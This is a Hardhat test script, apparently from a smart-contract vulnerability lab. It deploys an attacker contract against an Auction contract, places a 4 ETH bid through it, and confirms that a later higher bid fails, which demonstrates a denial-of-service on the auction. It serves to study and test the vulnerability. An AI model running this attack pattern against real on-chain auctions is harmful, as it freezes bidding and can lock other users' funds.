const { logtime } = require("./libraries/timelogger");
const { expect } = require("chai");
const { parseEther } = require("ethers/lib/utils");
const { ethers } = require("hardhat");
const fs = require("fs");

async function main() {
  logtime();
  const accounts = await ethers.getSigners();
  const attackerAccount = accounts[1];
  const anotherBidder = accounts[0];
  const auctionAddress = fs.readFileSync('./temp_files/contract_address.txt', 'utf8');
  console.log("Auction Contract Address:", auctionAddress);

  // Get the Auction contract factory and attach to deployed address
  const Auction = await ethers.getContractFactory("Auction");
  const auctionContract = Auction.attach(auctionAddress);

  const initialBid = await auctionContract.getHighestBid();
  console.log("Initial Highest Bid:", ethers.utils.formatEther(initialBid));

  // Deploy the Attacker contract
  const Attacker = await ethers.getContractFactory("contracts/N-AuctionAttack.sol:Attacker");
  const attacker = await Attacker.deploy(auctionAddress);
  await attacker.deployed();
  console.log("Attacker contract deployed at:", attacker.address);

  // Execute the attack
  const tx = await attacker.connect(attackerAccount).attack({ value: parseEther("4") });
  await tx.wait();
  console.log("Attack executed");

  // Check the new highest bid
  const newBid = await auctionContract.getHighestBid();
  console.log("New Highest Bid:", ethers.utils.formatEther(newBid));
  expect(newBid).to.equal(ethers.utils.parseEther("4"));

  console.log("Now someone else bids higher");

  var flag = false;

  try {
    const anothertx = await auctionContract.connect(anotherBidder).bid({ value: parseEther("5") });
    await anothertx.wait();
    console.error("Other Bidder successful");
  } catch (error) {
    console.log("Other Bidder was unsuccessful, the attack worked");
    flag = true;
  }
  
  logtime();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});